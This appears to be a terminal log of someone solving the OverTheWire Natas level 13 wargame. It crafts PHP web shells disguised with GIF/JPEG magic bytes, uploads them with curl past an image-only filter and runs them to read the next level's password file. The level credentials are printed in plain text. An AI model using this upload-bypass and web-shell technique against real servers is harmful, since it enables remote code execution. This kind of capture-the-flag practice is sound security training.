@@ -1,0 +1,89 @@
+──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ # Create a minimal GIF with PHP code inside
+printf 'GIF89a<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.gif.php
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ # Create a minimal JPEG header with PHP
+printf '\xff\xd8\xff<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.jpg.php
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ echo -n 'GIF89a' > shell.php
+echo '<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' >> shell.php
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ xxd shell.php | head -1
+# Should show: 47494638 3961... (GIF89a in hex)
+00000000: 4749 4638 3961 3c3f 7068 7020 6563 686f  GIF89a<?php echo
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+The file <a href="upload/mxtu50ijee.php">upload/mxtu50ijee.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/abc123.php
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.66 (Ubuntu) Server at natas13.natas.labs.overthewire.org Port 80</address>
+</body></html>
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/shell.php 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.66 (Ubuntu) Server at natas13.natas.labs.overthewire.org Port 80</address>
+</body></html>
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ # Upload and extract the path
+UPLOAD_URL=$(curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/ | \
+     grep -o 'upload/[a-z0-9]*\.php')
+
+echo "Uploaded to: $UPLOAD_URL"
+
+# Now visit it
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     "http://natas13.natas.labs.overthewire.org/$UPLOAD_URL"
+Uploaded to: upload/yz7h2v3s8g.php
+upload/yz7h2v3s8g.php
+curl: (3) URL rejected: Malformed input to a URL function
+                                                                                                                                                    
+┌──(white㉿white)-[~/white/gemini/otw/natas]
+└─$ curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/mxtu50ijee.php
+GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
